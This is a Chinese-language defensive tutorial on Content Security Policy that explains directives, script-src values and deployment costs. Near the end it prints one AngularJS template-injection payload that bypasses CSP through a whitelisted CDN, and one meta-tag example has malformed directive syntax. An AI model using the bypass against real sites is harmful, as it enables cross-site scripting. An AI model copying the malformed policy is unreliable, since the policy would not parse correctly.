web服务器在HTTP响应中插入一个Content-Security-Policy头，告知浏览器当前网页允许加载的资源列表。告知浏览器只能加载特定域名的资源，本质上是一种白名单，让浏览器不会加载和运行预期之外的内容。
CSP安全指令大致：
+ default-src：指定默认的资源加载策略，适用于没有明确指定策略的资源类型。

+ script-src：指定可以加载和执行 JavaScript 代码的来源。

+ style-src：指定可以加载和应用 CSS 样式的来源。

+ img-src：指定可以加载图片的来源。

+ font-src：指定可以加载字体文件的来源。

+ connect-src：指定可以进行网络请求的来源，如 AJAX、WebSockets 等。

+ media-src：指定可以加载音频和视频文件的来源。

+ object-src：指定可以加载 \<object> 标签的资源的来源。

+ frame-src：指定可以加载\<frame> 和 \<iframe> 标签的来源。

+ worker-src：指定可以加载 Web Worker 脚本的来源。

+ child-src：指定可以加载嵌入的资源（如 \<frame>、\<iframe>、\<embed> 和 \<object>）的来源。

+ form-action：指定可以提交表单的目标地址。

+ frame-ancestors：指定可以嵌入当前页面的父级页面的来源。

+ base-uri：指定可以用作 \<base> 标签的 href 属性值的来源。

+ report-uri：指定报告违规情况的地址。
除了HTTP头，CSP也支持在HTML页面中嵌入`<meta>`标签来指定策略，如：
```
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```
也可以写多条策略：
```
<meta http-equiv="Content-Security-Policy" content="default-src 'self' img-src '*' media-src 'media1.com' script-src 'userscript.example.com'">
```
通过前端指定了(也可以通过后端服务器的配置文件中添加响应内容)默认加载的资源，从任意域名加载图片等
一般需要定义一条默认策略(default-src)，用来指示针对未定义资源类型的默认策略，这样才能起到"白名单"效果。
当定义了script-src或default-src，就明确指定了可信的源，HTML页面中内联的JavaScript代码将被禁止执行；同时，HTML页面中各个节点事件属性中的代码也不能执行，需要addEventListener为DOM节点绑定事件处理程序。
```
addEventListener("event",function(),userCapture)`
<button id="myBtn">click me</button>
<p id="demo">
<script src="script.js"></script>
```
script.js文件：
```
document.getElementById("myBtn").addEventListener("click",function(){
    document.getElementById("demo").innerHTML="hello world";
});
```
通过addEventListener将click事件和function要执行的操作绑定起来，通过外部引用的方式将JS文件引入保证其安全。
所有资源只能从外部嵌入，危险函数eval()也被禁止，这样就很好地实现了数据和代码分离
script-src的值有：
+ 'self'：表示只允许从同源（即当前网页的域名和协议与脚本来源的域名和协议相同）加载和执行 JavaScript 代码。

+ 'unsafe-inline'：表示允许在 HTML 内联中嵌入 JavaScript 代码。

+ 'unsafe-eval'：表示允许使用 eval() 函数和类似的动态代码执行方法。

+ 'nonce-value'：表示允许使用特定的随机值（nonce）作为脚本的来源。

+ 'strict-dynamic'：表示启用严格的动态执行策略，允许通过内联脚本标签或者使用 nonce 或 hash 指令加载和执行脚本。

+ 'hash-value'：表示允许使用特定的哈希值作为脚本的来源。

+ URL：表示允许从指定的 URL 加载和执行 JavaScript 代码。
如果一定要使用\<script>标签内联嵌入JavaScript代码，可以指定script-src的源为`'unsafe-inline'`，就可以允许执行内联代码。(该方式放款了CSP的安全限制)
除了指定可信资源列表，CSP有其他指令，如`upgrade-insecure-requests`，要求其必须使用HTTPS协议来加载资源。
CSP的`base-uri`指令可以限制HTML中的\<base>标签可使用的URI列表。
CSP有很多指令能够限制前端页面的行为，如页面跳转、表单提交目的地址等。
功能强大，但部署成本太高：
+ 网站引用的外部资源复杂，动态变化的外部资源导致其难以维护
+ 已有的Web应用改造成本很高
+ CSP推动开发人员使用更安全的编码方式，但转换成本高
注意：需要指定default-src，script-src，Object-src，不要使用不安全的值。
如果网站使用了前端JavaScript框架，如jQuery、AngularJS，那么可以插入特定的HTML标签或模板让这些框架来渲染和执行。
如果CSP 中指定了script-src包含提供公共JavaScript库托管 的CDN域名，攻击者可以载入这些域名下的框架，再利用框架进行渲染执行
```
<script src="https://ajax.googleapis.com/ajaxlibs/angularjs/1.8.2/angular.min.js"></script>
<div ng-app ng-csp>{{constructor.constructor('alert(document.domain)')()}}</div>
```
配置CSP网站的URL时需统一配置，以防遗漏。
## 关于XSS filter
不少浏览器自身实现过对XSS攻击的防御，但是其局限性导致容易被绕过，且可能会造成业务上的干扰。因此，如今这项技术已经逐渐被弃用。